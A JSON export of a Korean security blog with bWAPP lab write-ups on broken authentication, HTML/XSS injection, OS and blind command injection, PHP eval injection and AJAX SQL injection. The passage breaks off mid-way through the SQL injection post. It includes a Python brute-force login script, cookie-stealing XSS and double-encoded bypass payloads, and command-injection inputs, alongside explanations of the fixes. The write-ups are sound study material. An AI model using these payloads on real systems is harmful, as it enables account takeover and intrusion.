{"pages":[{"title":"","text":"[{\"name\":\"DASHENG-900x700-1.png\",\"date\":1518959551960},{\"name\":\"DASHENG-900x700-2.png\",\"date\":1518959599098},{\"name\":\"DASHENG-900x700-3.png\",\"date\":1518959609913},{\"name\":\"DASHENG-900x700-4.png\",\"date\":1518959618105}]","link":"/hexo-admin-ehc-images.json"}],"posts":[{"title":"Broken Auth - Forgotten Fuction","text":"Broken Auth - Forgotten FunctionLowbWAPP에 가입된 사용자의 Email를 입력하면 사용자의 비밀이 출력되는 페이지이다. 현재 bWAPP에 가입된 사용자의 Email를 알지 못하여, Create User 메뉴를 이용하여 사용자를 만들어줬다. 입력하니, 회원 가입할 때 입력한 secret이 출력되는 것을 확인 할 수 있었다. 여러 방법을 시도 했으나, 어떠한 취약점을 찾아 볼 수 없었다. 그래서 다른 분들의 Wirte Up를 찾아보니, bee 계정의 이메일을 넣어서 비밀을 보고 패스워드를 추측할 수 있다는 것이 이 문제의 답이였다. Bee 계정의 이메일 : bwapp-bee@mailinator.com해당 비밀을 보니, 패드워드는 bug와 관련된 확률이 높을 것으로 추측된다. 이 단서를 가지고 brute-force 공격을 시도하여 패스워드를 찾는게 이 문제의 답이였다. Medium &amp; High이 문제는 Medium과 High와 같다. 이메일을 입력하여 출력 결과를 보니, “이메일을 보내 수 없다.” 라는 결과를 얻을 수 있었다. 이 것을 보니 비밀은 이메일로 보내는 것을 알 수 있다. 이렇게 되면 해커가 이메일 계정 정보를 가지고 있지 않는 한 비밀이 유출되는 것을 막을 수 있을 것이다.","link":"/2021/01/26/Broken-Auth-Forgotten-Fuction/"},{"title":"Broken Auth - Insecure Login Forms","text":"Broken Auth. - Insecure Login FormsLow bee 계정으로 로그인을 시도했지만, 로그인에 실패하였다.form이 어디에 데이터를 보내는지, 문자 길이 제한 등을 확인하기 위해 개발자 도구를 이용하여 확인하였다. 1234567891011&lt;form action=&quot;/ba_insecure_login_1.php&quot; method=&quot;POST&quot;&gt; &lt;p&gt; &lt;label for=&quot;login&quot;&gt;Login:&lt;/label&gt;&lt;font color=&quot;white&quot;&gt;tonystark&lt;/font&gt;&lt;br&gt; &lt;input type=&quot;text&quot; id=&quot;login&quot; name=&quot;login&quot; size=&quot;20&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;&lt;font color=&quot;white&quot;&gt;I am Iron Man&lt;/font&gt;&lt;br&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; size=&quot;20&quot;&gt; &lt;/p&gt; &lt;button type=&quot;submit&quot; name=&quot;form&quot; value=&quot;submit&quot;&gt;Login&lt;/button&gt; &lt;/form&gt; 위 코드를 확인해보니, /ba_insecure_login_1.php에 보내는 것을 확인할 수 있다.특이한 것은 흰색으로 tonystark과 I am Iron Man이 적혀져 있었다. 이 값을 form에 입력하여 전송했다. 로그인 성공 메시지가 출력되었다. 이런 경우가 진짜 있나?라고 하지만, 몇몇 커뮤니티 사이트에서 글 올린 사람의 ip 주소를 색상을 변경하여 페이지에 올려진 경우도 있다. Medium 페이지를 보니, Name에 brucebanner라는 값이 defalt로 지정되어있다.bruce를 보니, bruce force 공격을 의심이 된다. 15번 연속으로 틀려도 아무 제제가 없다.무차별 대입 공격을 의심을 해볼 가치는 있지만, 다른 가능성을 열어놓고 소스코드를 살펴보았다. 1234567891011&lt;form&gt; &lt;p&gt; &lt;label for=&quot;name&quot;&gt;Name:&lt;/label&gt;&lt;font color=&quot;white&quot;&gt;brucebanner&lt;/font&gt;&lt;br&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot; size=&quot;20&quot; value=&quot;brucebanner&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;label for=&quot;passphrase&quot;&gt;Passphrase:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;password&quot; id=&quot;passphrase&quot; name=&quot;passphrase&quot; size=&quot;20&quot;&gt; &lt;/p&gt; &lt;input type=&quot;button&quot; name=&quot;button&quot; value=&quot;Unlock&quot; onclick=&quot;unlock_secret()&quot;&gt;&lt;br&gt;&lt;/form&gt; 마지막 input 부분에 클릭 시 unlock_secret() 함수를 실행하는 것을 볼 수 있다.어떤 기능을 실행하는지 확인하였다. 12345678910111213141516171819202122232425262728293031323334function unlock_secret(){ var bWAPP = &quot;bash update killed my shells!&quot; var a = bWAPP.charAt(0); var d = bWAPP.charAt(3); var r = bWAPP.charAt(16); var b = bWAPP.charAt(1); var e = bWAPP.charAt(4); var j = bWAPP.charAt(9); var c = bWAPP.charAt(2); var f = bWAPP.charAt(5); var g = bWAPP.charAt(4); var j = bWAPP.charAt(9); var h = bWAPP.charAt(6); var l = bWAPP.charAt(11); var g = bWAPP.charAt(4); var i = bWAPP.charAt(7); var x = bWAPP.charAt(4); var l = bWAPP.charAt(11); var p = bWAPP.charAt(23); var m = bWAPP.charAt(4); var s = bWAPP.charAt(17); var k = bWAPP.charAt(10); var d = bWAPP.charAt(23); var t = bWAPP.charAt(2); var n = bWAPP.charAt(12); var e = bWAPP.charAt(4); var a = bWAPP.charAt(1); var o = bWAPP.charAt(13); var f = bWAPP.charAt(5); var b = bWAPP.charAt(1); var q = bWAPP.charAt(15); var h = bWAPP.charAt(9); var c = bWAPP.charAt(2); var h = bWAPP.charAt(2); var i = bWAPP.charAt(7); var j = bWAPP.charAt(5); var i = bWAPP.charAt(7); var y = bWAPP.charAt(22); var g = bWAPP.charAt(1); var p = bWAPP.charAt(4); var p = bWAPP.charAt(28); var l = bWAPP.charAt(11); var k = bWAPP.charAt(14); var q = bWAPP.charAt(12); var n = bWAPP.charAt(12); var m = bWAPP.charAt(4); var o = bWAPP.charAt(19); var secret = (d + &quot;&quot; + j + &quot;&quot; + k + &quot;&quot; + q + &quot;&quot; + x + &quot;&quot; + t + &quot;&quot; +o + &quot;&quot; + g + &quot;&quot; + h + &quot;&quot; + d + &quot;&quot; + p); if(document.forms[0].passphrase.value == secret) { // Unlocked location.href=&quot;/ba_insecure_login_2.php?secret=&quot; + secret; } else { // Locked location.href=&quot;/ba_insecure_login_2.php?secret=&quot;; }} 해더 부분에 정의된 unlock_secret 함수이다.charAt 함수가 무슨 함수인지 몰라서 인터넷에 검색하였다. ) 알파벳 변수에 bWAPP 변수의 문자열을 charAt 함수로 지정된 인덱스에 해당한 값을 넣어주고, secret 변수에 필요한 알파벳 변수만 넣었다. 그리고 Passphrase 값이 secret 변수와 같으면 secret 변수를 서버로 전송하였다. 기능은 확인하였으니, secret 값을 구해보겠다. 개발자 도구의 Console에 해당 부분을 넣어서 출력하는 방법으로 secret 값을 구할 수 있었다. 로그인에 성공한 모습이다. 여기서 알 수 있는 점은 패스워드와 같은 중요한 값은 클라이언트에서 검증하기보단 서버에서 검증하는 것이 더 안전하다는 것을 알 수 있었다. High 이번엔 form 밑에 Remember 데이터가 있다.이 값을 입력하여 로그인을 하였다. 굳이 글로 쓰자면, 계정 정보를 추측 할 수 있는 데이터는 안전한 페이지나 이메일로 전달해야 안전하다는 것을 알 수 있었다.","link":"/2021/02/02/Broken-Auth-Insecure-Login-Forms/"},{"title":"Broken Auth - Logout Management","text":"Low here를 누르면 로그아웃이 된다고 써져있다.개발자 도구를 이용하여 소스코드를 살펴보았다. 1&lt;a href=&quot;ba_logout_1.php&quot; onclick=&quot;return confirm('Are you sure?');&quot;&gt;here&lt;/a&gt; here를 클릭하면, 확인 alert 창이 뜨고 ba_logout_1.php로 이동하는 것을 볼 수 있었다. 세션이 제대로 만료가 됬는지 확인을 위해 뒤로가기를 하였다. 하지만 세션은 제대로 처리가 안되서 로그인이 된 채로 원래 페이지로 돌아왔다. Source Code123456789101112131415161718192021222324&lt;?phpswitch($_COOKIE[&quot;security_level&quot;]){ case &quot;0&quot; : // Do nothing break; case &quot;1&quot; : // Destroys the session session_destroy(); break; case &quot;2&quot; : // Unsets all of the session variables $_SESSION = array(); // Destroys the session session_destroy(); break; default : // Do nothing break;}?&gt; Low는 0으로 매핑 되어있는데 로그아웃 기능을 연결시켜주는 코드를 보니 0은 아무것도 하지 않고 끝난다. Medium &amp; High위 Source Code를 보면 session_destroy 함수를 이용하여 세션을 처리해주었다.","link":"/2021/02/04/Broken-Auth-Logout-Management/"},{"title":"Broken Auth - Password Attacks","text":"Low &amp; Medium 이번엔 비밀번호 공격이라는 문제가 나왔다.어떤 방식으로 작동하는지 잘 모르겠어서 알고있는 계정인 bee/bug를 입력하여 성공 시 어떤 출력값이 나오는지와 틀리면 어떤 출력값이 나오는지 살펴보았다. 실패한 출력값이 비밀번호가 틀렸다는 문구가 나왔다.아이디를 넣으면 어떤 출력값이 나오는지도 살펴보았지만, 똑같은 출력이 나온다. 만약 아이디가 틀렸을 시, ‘가입된 회원이 아닙니다.’ 문구가 나왔으면 가입된 아이디를 파싱하는데 중요한 키워드가 될 것이다. 일단 정확한 아이디 값이 있으면, 비밀번호를 무차별 대입 공격으로 찾을 수 있을 것이다. burp suite으로 공격하는 쉬운 방법도 있지만, 공부하는 마음으로 파이썬으로 직접 제작하여 공격해보겠다. Brute force attack code123456789101112131415161718192021222324252627282930313233343536373839404142import requestsfrom bs4 import BeautifulSoup as bsfrom string import ascii_letters, digitsfrom itertools import productclass Attack(): def __init__(self, url, sesstion, level): self._url = url self._sesstion = sesstion self._level = level self._sesstionData = {'security_level' : self._level, 'PHPSESSID' : self._sesstion} self.passwordList = () def word_create(self): charList = ascii_letters + digits passwordLegth = int(input('Password Legth : ')) self.passwordList = tuple(product(charList, repeat=passwordLegth)) # return self.passwordList def attack_start(self): userId = input('id : ') for _ in self.passwordList: datas = {'login' : userId, 'password' : ''.join(_), 'form' : 'submit'} req = requests.post(url, data=datas, cookies=self._sesstionData) html = req.text soup = bs(html, 'html.parser') result = soup.select_one('#main &gt; font') if result == 'Successful login!': return ''.join(_)if __name__ == '__main__': url = input('taget : ') sesstion = input('sesstion : ') level = input('level : ') test = Attack(url, sesstion, level) test.word_create() print(test.attack_start()) 만들긴 했으나, 패스워드를 얻기 위해 엄청난 시간이 필요하다.멀티프로세싱을 했으면, 좀 더 빠르게 끝낼 수는 있다. 위 코드의 결과값으로 패스워드는 bug가 나왔다.시간이 굉장히 많이 걸리니, 코드를 수정하여 멀티프로세싱을 하거나 burp suit으로 시도하면 된다. 그리고 위에서 나온대로 아이디가 틀렸을 시 ‘가입된 회원이 아닙니다.’ 문구가 나오면 아이디를 파싱할 수 있다고 했는데 Create User에서 파싱 할 수 있다. 출력값이 로그인 또는 이메일이 이미 존재한다고 나온다. High무차별 대입 공격의 해결 방법으로 해당 사진에서는 캡챠 사진이 안보이지만, 캡챠를 도입하여 bot의 공격을 차단하였다.하지만 Death by Captcha, Antigate, Anti Captcha 등 캡챠를 우회하기 위한 API가 있으므로, 캡챠만 사용해선 좋은 방어가 아니라고 생각한다. 여기서 횟수 제한을 주어 로그인 실패 횟수가 되면 몇 분 동안 로그인 시도를 못하도록 하고, 횟수 제한으로 로그인 제제가 몇 번 일어나면 하루동안 IP를 차단하거나 해당 계정의 로그인을 못하도록 해야하는 것이 좋은 방어 방법이라 생각한다.","link":"/2021/02/05/Broken-Auth-Password-Attacks/"},{"title":"HTML Injection - Reflected(GET &amp; POST)","text":"Get문제와 Post문제는 동일한 방법으로 진행됨으로 Get문제 풀이만 하겠다. Low문제 제목이 HTML 인젝션이니 확인을 위해 First Name에 HTML 태그를 입력하겠다. &lt;h1&gt;test&lt;/h1&gt; 입력하니 HTML 태그가 그대로 적용이 되어있다. HTML 태그가 적용이 된다는 것은 자바스크립트도 적용이 된다는 뜻으로 이어갈 수 있다. &lt;script&gt;alert(document.cookie)&lt;/script&gt; 자바스크립트로 Cookie 값을 출력하였다.이런식으로 신뢰하지 못하는 사용자가 입력을 할 수 있는 입력은 검증이 필요하다. Medium문제의 난이도가 올라갔으니 입력 값에 대한 검증이 있을 것이다.그래도 일단 확인을 위해 Low Level처럼 HTML 태그를 입력하겠다. &lt;h1&gt;test&lt;/h1&gt; HTML 태그가 적용이 되지 않고 그대로 출력된 것을 확인 할 수 있다. php 소스코드를 확인을 안했다는 하에 추측상으로 &lt;, &gt;, /이 치환되었다고 생각할 수 있다.치환을 우회할 수 있는 방법을 검색하였다. 검색 결과 Double Url Encoding을 통해 우회할 수 있다는 정보를 얻을 수 있었다.이를 이용하기 위해서 &lt;, &gt;, /을 Url 인코딩하여 입력하겠다. 12345from urllib import parsestring = input()parameter = { 'substitution' : string }print( parse.urlencode(parameter, encoding='UTF-8', doseq=True) ) Online Url Encoding : https://www.convertstring.com/ko/EncodeDecode/UrlEncode 파이썬 코드와 온라인 Url인코딩을 이용하여 &lt;script&gt;alert(document.cookie)&lt;/script&gt;을 Double Url Encoing하였다. %253cscript%253ealert(document.cookie)%253c%252fscript%253e 사실 이렇게 안해도 form에 Url Encoding만 넣어줘도 자동으로 특수문자가 Url Coding이 되기 때문에 굳이 Url에 Double Url Encoding을 직접 입력하지 않고, form에 Url 인코딩만 넣어도 된다. Xss를 성공했으니, 어떻게 &lt;, &gt;, /를 치환했는지 확인하겠다. functions_external.php의 xss_check_1함수를 확인하였다. 1234567891011121314function xss_check_1($data){ // Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities $input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data); $input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input); // Failure is an option // Bypasses double encoding attacks // &lt;script&gt;alert(0)&lt;/script&gt; // %3Cscript%3Ealert%280%29%3C%2Fscript%3E // %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E $input = urldecode($input); return $input;} 확인해보니, &lt;, &gt;를 이스케이핑으로 php의 str_replace을 사용하여 치환하였다.하지만 Url 인코딩으로 서버에서는 %253c으로 입력받기 때문에 치환을 우회할 수 있었다. HighHigh 단계는 거의 우회하기 힘든 단계이다.소스코드를 살펴보도록 하겠다. 123456function xss_check_2($data){ // htmlentities - converts all applicable characters to HTML entities return htmlentities($data, ENT_QUOTES); } htmlentities()을 이용하여 xss를 검증하고 있다. htmlentities()은 밑과 같은 문자를 치환하는 함수이다. &amp;는 &amp;amp;가 됩니다 &quot;는 ENT_NOQUOTES를 설정하지 않았을 때 &amp;quot;가 됩니다. '(홑따옴표)는 ENT_QUOTES가 설정되었을 때만 &amp;#039;가 됩니다. &lt;(미만)은 &amp;lt;가 됩니다. &gt;(이상)은 &amp;gt;가 됩니다. Url Encoding이란?정확히는 **퍼센트 인코딩(Percent Encoding)**이 맞지만, 흔히 Url에서 사용되어 Url 인코딩으로 불리고 있다.퍼센트 인코딩은 Url에서 사용할 수 없는 문자(특수문자, 예약문자 등등)을 사용할 수 있도록 인코딩한다. 인코딩된 문자는 triplet(트리플렛, 세개가 한묶음)로 인코딩되며, 인코딩된 문자는 %로 시작한다. 그 뒤의 두 숫자는 16진수로 표현된다. [참고 사이트] 욕망의개발자(네이버 블로그) : https://m.blog.naver.com/PostView.nhn?blogId=j880825&amp;logNo=221231640609&amp;proxyReferer=https:%2F%2Fwww.google.com%2F 퍼센트 인코딩(위키백과) : https://ko.wikipedia.org/wiki/%ED%8D%BC%EC%84%BC%ED%8A%B8_%EC%9D%B8%EC%BD%94%EB%94%A9 Double Url Encoding이란?쉽게 말하면 Url 인코딩을 다시 한번 더 Url 인코딩을 한 것이다. 이 공격 기술은 흔히 공격 기술처럼 예상치 못한 동작을 유발하기 위해 2번 인코딩을 한 것이다.가능한 이유는 웹서버가 다양한 인코딩 형식으로 클라이언트 요청을 수락하고 처리하기 때문이다. 이스케이핑이란?HTML 코드는 브라우저에 의해서 해석되는 약속된 문자들이다.주로, 웹사이트에 HTML 태그 본 그래로 출력하려고 하는데 브라우저에서는 바로 HTML로 출력하게 된다. 이 떄문에 이스케이핑을 사용하여 HTML 태그를 출력하게 한다. [참고 사이트] 생활코딩 : https://opentutorials.org/course/1469/2824","link":"/2020/12/06/HTML-Injection-Reflected-GET/"},{"title":"HTML Injection - Reflected(URL)","text":"Low들어가보니 딸랑 이거 뿐이다.문제의 제목을 보니 URL이니깐 URL에 HTML 태그를 넣어주면 반영해주는 것 같다. Burp Suite를 사용하여 URL에 HTML 태그를 넣어줬다. ?&lt;h1&gt;test&lt;/h1&gt; 12345678910GET /bWAPP/htmli_current_url.php?&lt;h1&gt;test&lt;/h1&gt; HTTP/1.1Host: 192.168.219.111Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=a10521c7e9d86bd7482f26f136d6cbe2; security_level=0Connection: close 여기서 직접 Url창에 입력하지 않은 이유는 Url창에 입력하여 서버에 요청을 하면 브라우저에서 특수문자를 Url Encoding을 하여 요청을 보내기 때문이다.하지만 HTML Injection - Reflected(GET)에서는 됬는데 왜 여기서는 안되는 이유는 이 문제의 php 기능 중에 Url Decoding을 하지 않기 때문이다. 12// $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . urldecode($_SERVER[&quot;REQUEST_URI&quot;]);$url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . $_SERVER[&quot;REQUEST_URI&quot;]; Burp Suite을 사용하면 문자열 그대로 요청이 되기 때문에 Burp Suite를 사용한 것이다. Medium이 문제는 취약점이 실행되지 않는다. 1$url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;; Medium Level에서는 URL를 document.write을 이용하여 페이지에 출력을 한다.문제는 자바스크립트로 실행되기 때문에 마지막에 실행된다는 점을 이용한 취약점이다. (브라우저에서 자바스크립트 소스코드를 마지막에 실행시킨다.) 취약점의 이름은 DOM Xss라고 한다.하지만 지금은 모든 브라우저에서 패치를 했는지, Iternet Expoler에서도 실행이 안된다. 12345678910GET /bWAPP/htmli_current_url.php#&lt;h1&gt;test&lt;/h1&gt; HTTP/1.1Host: 192.168.219.111Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=a10521c7e9d86bd7482f26f136d6cbe2; security_level=1Connection: close URL 뒤에 #은 fragment이라고 한다.fragment은 브라우저 내부에서 사용되는 값이다. High1$url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]); HTML Injection - Reflected(GET)의 High Level에서 봤던 xss_check_3을 사용하여 검증했다.취약점은 못찾았다. DOM Xss이란?정확한 명칭은 DOM Based Xss이라고 한다.(type-0 Xss이라고도 불리기도 함.)DOM Xss은 브라우저에서 DOM 렌더링에서 실행되는 Xss공격이다. DOM에 대한 지식이 필요함으로 밑에 적은 블로그의 글을 읽고 이해하시면 된다. [참고 사이트] WIT블로그 : https://wit.nts-corp.com/2019/02/14/5522","link":"/2020/12/06/HTML-Injection-Reflected-URL/"},{"title":"HTML Injection - Stored(Blog)","text":"Low일단 HTML 태그가 실행되는지 확인을 하겠다. HTML 태그가 실행이 되는거 보니, 입력에 대한 검증이 없는 것 같다. 자바스크립트가 실행이 되었으며, 입력된 스크립트는 저장이 되어 페이자가 실행될 때 마다 Cookie 값을 출력한다. 이상하게 코드가 전혀 다른 기능인 sqli_check_3함수를 실행시키고 있다.하지만 기능은 xss_check_1이 실행되는 거로 판단이 된다. Medium, High도 HTML Injection_Reflected(GET)과 같이 작동하는 것로 추측된다. 해당 풀이도 같으니, 더 작성하지는 않겠다.","link":"/2020/12/06/HTML-Injection-Stored-Blog/"},{"title":"OS Injection Blind","text":"Blind Command Injection이란?시스템 명령의 수행 결과 값이 없이 수행하는 Injection 공격이다. LowForm에 IP나 도메인을 입력하면 Ping을 보내는 페이지인 것 같다.DNS 서버인 8.8.8.8를 입력하여 어떻게 출력되는지 확인하였다. Did you captured our GOLDEN packet?이라는 문구만 출력이 되고, 잘 작동되는지도 모르겠다.그래서 확실한 오류를 일으키고자, 입력 값을 넣지 않고 서버에 넘겨보았다. IP를 입력하라는 문구가 나오는 것을 확인할 수 있었다.빈 입력 값을 검증하는 코드가 있는 것 같다. 다른 방법으로 현재 나의 집 라우터에 없는 주소를 입력하여 오류를 일으켜보겠다.DNS 서버의 IP을 넘겨줄 때랑 같은 문구를 확인 할 수 있었다.문제의 이름처럼 Blind로 이루어진 페이지로 확인이 되었다. 이제 OS Command Injection 문제처럼 다중 명령어를 사용하여 Command Injection을 시도하였다. 8.8.8.8 &amp; echo hi!! &gt;&gt; test.txt를 입력해주었다.나는 Injection 잘 수행이 되었는지 확인하기 위해서 test.txt를 생성하였다. 또 다른 확인 방법은 Netcat을 이용하여 확인하는 방법이 있다. 서버에 Injection 입력 값을 넘겨주고, 파일이 잘 생성됬는지 확인하였다.http://localhost/bWAPP/test.txt 잘 생성이 된 것을 확인할 수 있다. 이 취약점을 이용하여 악성코드를 이처럼 만들 수도 있고, 아니면 파일을 삭제를 할 수 있다. Source Codefunctions_external.php 123function no_check($data){ return $data;} commandi_blind.php 1234567891011121314151617181920212223if($target == &quot;&quot;){ echo &quot;&lt;font color=\\&quot;red\\&quot;&gt;Please enter your IP address...&lt;/font&gt;&quot;;}else{ echo &quot;Did you captured our GOLDEN packet?&quot;; if(PHP_OS == &quot;Windows&quot; or PHP_OS == &quot;WINNT&quot; or PHP_OS == &quot;WIN32&quot;){ // Debugging // echo &quot;Windows!&quot;; // Increasing the PING count will slow down your web scanner! shell_exec(&quot;ping -n 1 &quot; . commandi($target)); } else{ // Debugging // echo &quot;Not Windows!&quot;; // Increasing the PING count will slow down your web scanner! shell_exec(&quot;ping -c 1 &quot; . commandi($target)); }} 코드를 보니 입력 값을 검사하는 항목은 빈 입력을 검사하는 것 밖에 없다. Medium아마 OS Command Injection 문제의 Medium Leval처럼 특정 문자를 치환하는 것으로 방어를 할 것으로 생각되지만 일단 해보겠다. 8.8.8.8 | echo Hi!! Medium &gt;&gt; test.txt을 입력하여 제대로 생성이 됬는지 확인하였다.예상대로 OS Command Injection 문제와 똑같이 방어를 한 것으로 추측된다. Source Code123456function commandi_check_1($data){ $input = str_replace(&quot;&amp;&quot;, &quot;&quot;, $data); $input = str_replace(&quot;;&quot;, &quot;&quot;, $input); return $input; } 파이프(|)가 치환되지 않았다. 또한 Command Injection에 많이 쓰이는 {}, (), $ 등등 다른 것들도 치환하지 않는 것을 확인할 수 있었다. High123function commandi_check_2($data){ return escapeshellcmd($data); } 이에 대한 설명은 OS Command Injection에서 확인하면 된다.Link : http://lrtk-github.io/2020/12/12/OS-Injection/","link":"/2020/12/12/OS-Injection-Blind/"},{"title":"OS Injection","text":"리눅스 다중 명령어 세미클론(;) : 하나의 라인에 주어진 명령어들을 성공,실패와 관련 없이 전부 실행한다. 파이프(|) : 앞 명령어의 실행 결과를 뒤 명령어에 전달하여 실행한다. 더블 버티컬바(||) : 앞에서부터 순차적으로 실행하되, 명령 실행에 성공하면 뒤에 오는 명령을 실행하지 않는다. 엠퍼센트(&amp;) : 앞의 명령어를 백그라운드로 돌리고 동시에 뒤의 명령어를 실행한다. 더블 엠퍼센트(&amp;&amp;) : 앞에서부터 순차적으로 실행하되, 명령 실행에 실패할 경우 뒤에 오는 명령은 실행하지 않는다. Lowform에 nslookup 명령어 인자값을 전달 받아서 nslookup을 실행하는 페이지인 것 같다.리눅스의 다중 명령어를 삽입하였다. www.nsa.gov &amp; ls -al commandi.php 성공한 것을 보니 아마 검증이 없는 것 같다. Source Code123function no_check($data){ return $data; } 코드를 보니 검증이 없었다. MediumLow Level에 시도한 &amp;은 검증을 통해 제거가 된 것 같다.또한 nslookup 결과도 안뜨는 것을 보니 특정 문자가 있으면 넘어온 데이터를 제거를 하는 것 같다. 현 입력에서 쓸 수 있는 다중 명령어(;, |)도 블랙리스트에 들어있는지 확인 하였다. www.nsa.gov | ls -al commandi.php 파이프는 블랙리스트에 없던 것으로 결과가 나왔다. Source Code123456function commandi_check_1($data){ $input = str_replace(&quot;&amp;&quot;, &quot;&quot;, $data); $input = str_replace(&quot;;&quot;, &quot;&quot;, $input); return $input; } 소스코드를 보니 역시 파이프(|)는 검증에 넣지 않은 모습을 확인 할 수 있었다.하지만 좀 이상한 것은 특정 문자가 있으면 지워서 반환을 하는데 nslookup 명령어는 왜 실행이 안된는 것은 디버깅을 통해 알아봐야 할 것 같다. Hight시도하였지만 모두 통하지 않았다…또한 다중 명령어 말고도 \\n, $()으로도 우회를 시도하였지만 차단되었다. Source Code123function commandi_check_2($data){ return escapeshellcmd($data);} escapeshellcmd 함수를 이용하여 OS Command Injection를 방어한 것을 확인 할 수 있었다. escapeshellcmd이란?link : https://www.php.net/manual/en/function.escapeshellcmd.php OS Injection에 사용될 수있는 문자열의 모든 문자를 이스케이프하는 함수이다. [ 치환 목록 ]&amp; # ; ` | * ? ~ &lt;&gt; ^ () [] {} $ \\ \\x0A \\xFF 이 문자는 앞에 \\를 붙어서 치환이 된다.또한 ', &quot;은 하나의 쌍으로 되었을 때만 치환이 된다. escapeshellcmd 함수의 우회법은 몇가지가 있어서 추후에 우회를 시도하겠다.","link":"/2020/12/11/OS-Injection/"},{"title":"PHP Code Injection","text":"PHP Code Injection이란?웹 어플리케이션을 통해 PHP 코드를 입력하면, 웹 어플리케이션의 입력을 정상적으로 인식하여 개발자가 의도와는 다르게 내부에 있는 PHP 코드를 실행하는 취약점이다. Low페이지를 들어가니 This is just a test page, reflecting back your message...이라는 문구를 확인 할 수 있었다. 123&lt;p&gt;This is just a test page, reflecting back your &lt;a href=&quot;/bWAPP/phpi.php?message=test&quot;&gt;message&lt;/a&gt;...&lt;/p&gt; message를 자세히보니 a태그로 되어있는 것을 확인할 수 있었다. 클릭하여 넘어가보니, 서버에 message이라는 변수에 test를 넘어갔다.페이지에 그대로 test라는 문구가 써져있는 것을 확인할 수 있었다. 저는 message에 php 내장 함수를 넘겨서 어떻게 작동하는지 확인해보았다.http://localhost/bWAPP/phpi.php?message=exec(id) 실행이 잘되는 것을 확인할 수 있었다. Source Code123456if(isset($_REQUEST[&quot;message&quot;])){ // If the security level is not MEDIUM or HIGH if($_COOKIE[&quot;security_level&quot;] != &quot;1&quot; &amp;&amp; $_COOKIE[&quot;security_level&quot;] != &quot;2&quot;){ &lt;p&gt;&lt;i&gt;&lt;?php @eval (&quot;echo &quot; . $_REQUEST[&quot;message&quot;] . &quot;;&quot;);?&gt;&lt;/i&gt;&lt;/p&gt; }} 코드를 보니 message 변수에 넘기고, 아무 검증 없이 eval 함수를 이용하여 바로 출력하여 페이지에 반영하는 것을 볼 수 있다. Medium &amp; High 이번엔 검증이 추가가 되었는지 Low Level에서 했던 방법이 안된다.도통 모르겠어서 소스코드를 확인해보았다. Source Code1234// If the security level is MEDIUM or HIGHelse{ &lt;p&gt;&lt;i&gt;&lt;?php echo htmlspecialchars($_REQUEST[&quot;message&quot;], ENT_QUOTES, &quot;UTF-8&quot;);;?&gt;&lt;/i&gt;&lt;/p&gt;} 확인해보니 Medium &amp; High Level 같은 방어 방법으로 해결을 하였다.바로 htmlspecialchars 함수를 이용하여 특수 문자를 필터링하여 Injection을 방어하였다.","link":"/2020/12/15/PHP-Code-Injection/"},{"title":"SQL Injection(AJAX, JSON, JQUERY)","text":"Low보시는 것과 같이 첫번째 SQL Injection과 같은 문제가 나왔다.차이점이라면 자바스크립트를 사용하여 서버로 넘겨서 데이터를 받았다는 것이다. 개발자 도구를 이용하여 자바스크립트를 확인하겠다. 1234567891011121314151617181920212223242526272829303132$(&quot;#title&quot;).keyup(function(){ // Searches for a movie title var search = {title: $(&quot;#title&quot;).val()}; // AJAX call $.getJSON(&quot;sqli_10-2.php&quot;, search, function(data){ init_table(); // Constructs the table from the JSON data var total = 0; $.each(data, function(key, val){ total++; $(&quot;#table_yellow tr:last&quot;).after(&quot;&lt;tr&gt;&lt;td&gt;&quot; + val.title + &quot;&lt;/td&gt;&lt;td align='center'&gt;&quot; + val.release_year + &quot;&lt;/td&gt;&lt;td&gt;&quot; + val.main_character + &quot;&lt;/td&gt;&lt;td align='center'&gt;&quot; + val.genre + &quot;&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/&quot; + val.imdb + &quot;' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&quot;); }); // Empty result if (total == 0) { $(&quot;#table_yellow tr:last&quot;).after(&quot;&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;&quot;); } })});function init_table(){ $(&quot;#table_yellow&quot;).html(&quot;&lt;tr height='30' bgcolor='#ffb717' align='center'&gt;&quot; + &quot;&lt;td width='200'&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;td width='80'&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;td width='140'&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;td width='80'&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;&quot; + 